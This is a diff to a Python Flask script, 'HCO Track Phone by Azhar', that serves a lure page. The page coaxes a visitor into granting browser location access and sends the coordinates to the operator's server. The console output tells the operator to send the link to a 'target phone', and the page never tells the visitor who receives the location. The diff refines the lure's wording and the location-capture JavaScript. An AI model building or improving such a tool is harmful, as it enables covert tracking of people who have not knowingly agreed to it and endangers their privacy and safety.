@@ -1,5 +1,5 @@
-# HCO Track Phone by Azhar - ULTIMATE FIXED VERSION
-# Now with proper permission handling!
+# HCO Track Phone by Azhar - FINAL WORKING VERSION
+# No more permission errors!
 
 import os
 import subprocess
@@ -63,7 +63,7 @@ def find_port():
             continue
     return 8080
 
-# Flask routes - ULTIMATE FIXED VERSION
+# Flask routes - SIMPLE CLICK-BASED VERSION
 @app.route('/')
 def home():
     html = '''
@@ -97,16 +97,12 @@ def home():
                 background: lime;
                 color: black;
                 border: none;
-                padding: 20px 40px;
-                font-size: 20px;
+                padding: 25px 50px;
+                font-size: 22px;
                 font-weight: bold;
-                border-radius: 10px;
+                border-radius: 15px;
                 cursor: pointer;
                 margin: 20px 0;
-            }
-            .btn:disabled {
-                background: gray;
-                cursor: not-allowed;
             }
             .message {
                 font-size: 18px;
@@ -117,118 +113,113 @@ def home():
             }
             .success {
                 color: lime;
-                font-size: 22px;
+                font-size: 24px;
                 font-weight: bold;
+                padding: 20px;
             }
             .instructions {
                 color: yellow;
-                font-size: 16px;
-                margin: 10px 0;
+                font-size: 18px;
+                margin: 15px 0;
             }
         </style>
     </head>
     <body>
         <div class="container">
             <div class="logo">HCO TRACK PHONE BY AZHAR</div>
+            
             <div class="message">
-                <div class="instructions">📱 <strong>INSTRUCTIONS:</strong></div>
-                <div>1. Click the button below</div>
-                <div>2. <strong>ALLOW</strong> location permission in the popup</div>
-                <div>3. Wait for confirmation message</div>
+                <div class="instructions">📱 <strong>HOW TO USE:</strong></div>
+                <div>1. Click the BIG GREEN button below</div>
+                <div>2. Click <strong style="color:lime">ALLOW</strong> if browser asks for permission</div>
+                <div>3. That's it! Location will be sent automatically</div>
             </div>
-            <button class="btn" id="locationBtn" onclick="requestLocation()">📍 ALLOW LOCATION ACCESS</button>
-            <div id="status" class="message">Ready to track your location...</div>
+            
+            <button class="btn" onclick="getLocation()">📍 GET MY LOCATION</button>
+            
+            <div id="status" class="message">Click the button above to start</div>
         </div>
         
         <script>
-        let isRequesting = false;
-        
-        function requestLocation() {
-            if (isRequesting) return;
-            
+        function getLocation() {
             var status = document.getElementById('status');
-            var btn = document.getElementById('locationBtn');
+            var btn = document.querySelector('.btn');
             
             status.innerHTML = '🔄 Please wait...';
             btn.disabled = true;
-            btn.innerHTML = '🔄 Requesting...';
-            isRequesting = true;
+            btn.innerHTML = '🔄 Getting location...';
             
-            // Clear any previous errors
-            status.style.color = 'white';
-            
+            // Check if browser supports geolocation
             if (!navigator.geolocation) {
-                status.innerHTML = '❌ Geolocation not supported by your browser';
+                status.innerHTML = '❌ Your browser does not support location tracking';
                 btn.disabled = false;
                 btn.innerHTML = '📍 TRY AGAIN';
-                isRequesting = false;
                 return;
             }
             
-            function success(position) {
-                var lat = position.coords.latitude;
-                var lon = position.coords.longitude;
-                
-                status.innerHTML = '📡 Sending location...';
-                
-                // Send to server
-                fetch('/update', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        lat: lat, 
-                        lon: lon, 
-                        accuracy: position.coords.accuracy
-                    })
-                })
-                .then(response => {
-                    if (response.ok) {
-                        status.innerHTML = '<div class="success">✅ You are a good person! God Bless You 🙏</div>' +
-                                          '<div style="margin-top:20px;">📍 Location shared successfully!</div>' +
-                                          '<div style="margin-top:10px;">You can close this page now</div>';
-                        btn.style.display = 'none';
-                    } else {
-                        throw new Error('Server error');
-                    }
-                })
-                .catch(error => {
-                    status.innerHTML = '❌ Error sending location. Please try again.';
+            // Get current position
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    // Success - got location
+                    sendLocation(position.coords.latitude, position.coords.longitude, position.coords.accuracy);
+                },
+                function(error) {
+                    // Error handling
                     btn.disabled = false;
                     btn.innerHTML = '📍 TRY AGAIN';
-                    isRequesting = false;
-                });
-            }
-            
-            function error(err) {
-                console.log('Geolocation error:', err);
-                
-                if (err.code === err.PERMISSION_DENIED) {
-                    status.innerHTML = '❌ <strong>Permission denied!</strong><br>' +
-                                      'Please refresh the page and click "ALLOW" when asked for location access.';
-                } else if (err.code === err.TIMEOUT) {
-                    status.innerHTML = '❌ Location request timed out. Please try again.';
-                } else if (err.code === err.POSITION_UNAVAILABLE) {
-                    status.innerHTML = '❌ Location unavailable. Please enable GPS and try again.';
-                } else {
-                    status.innerHTML = '❌ Location access failed. Please try again.';
-                }
-                
-                status.style.color = 'red';
-                btn.disabled = false;
-                btn.innerHTML = '📍 TRY AGAIN';
-                isRequesting = false;
-            }
-            
-            // Request location with manual button click
-            navigator.geolocation.getCurrentPosition(
-                success, 
-                error, 
+                    
+                    if (error.code === error.PERMISSION_DENIED) {
+                        status.innerHTML = '❌ <strong>Permission was denied!</strong><br>' +
+                                         'Please refresh page and click <strong>ALLOW</strong> when asked';
+                    } else if (error.code === error.TIMEOUT) {
+                        status.innerHTML = '❌ Location request timed out. Please try again.';
+                    } else {
+                        status.innerHTML = '❌ Cannot get location. Please try again.';
+                    }
+                },
                 {
                     enableHighAccuracy: true,
-                    timeout: 30000,  // 30 seconds timeout
+                    timeout: 30000,
                     maximumAge: 0
                 }
             );
+        }
+        
+        function sendLocation(lat, lon, accuracy) {
+            var status = document.getElementById('status');
+            var btn = document.querySelector('.btn');
+            
+            status.innerHTML = '📡 Sending location...';
+            
+            // Send to server using fetch
+            fetch('/update', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    lat: lat,
+                    lon: lon,
+                    accuracy: accuracy
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    return response.text();
+                }
+                throw new Error('Network error');
+            })
+            .then(data => {
+                status.innerHTML = '<div class="success">✅ You are a good person! God Bless You 🙏</div>' +
+                                  '<div style="margin-top:15px;">📍 Location sent successfully!</div>' +
+                                  '<div style="margin-top:10px;">You can close this page now</div>';
+                btn.style.display = 'none';
+            })
+            .catch(error => {
+                status.innerHTML = '❌ Failed to send location. Please try again.';
+                btn.disabled = false;
+                btn.innerHTML = '📍 TRY AGAIN';
+            });
         }
         </script>
     </body>
@@ -248,7 +239,7 @@ def update():
             return "OK"
         return "ERROR"
     except Exception as e:
-        print(f"{RED}Error: {e}{RESET}")
+        print(f"{RED}Error processing location: {e}{RESET}")
         return "ERROR"
 
 def start_server(port):
@@ -313,7 +304,7 @@ def main():
     port = find_port()
     TRACKING_URL = f"http://{local_ip}:{port}"
     
-    print(f"{GREEN}✅ Server: {local_ip}:{port}{RESET}")
+    print(f"{GREEN}✅ Server started on: {local_ip}:{port}{RESET}")
     
     # Start server in thread
     server_thread = threading.Thread(target=start_server, args=(port,), daemon=True)
@@ -332,7 +323,7 @@ def main():
     print(f"\n{GREEN}📱 Send this link to target phone:{RESET}")
     print(f"{CYAN}{TRACKING_URL}{RESET}")
     print(f"\n{YELLOW}📍 QR code should open automatically{RESET}")
-    print(f"\n{BLUE}💡 Both phones must be on same WiFi{RESET}")
+    print(f"\n{BLUE}💡 Both phones must be on same WiFi network{RESET}")
     print(f"\n{RED}{'═'*60}{RESET}")
     
     # Wait for location
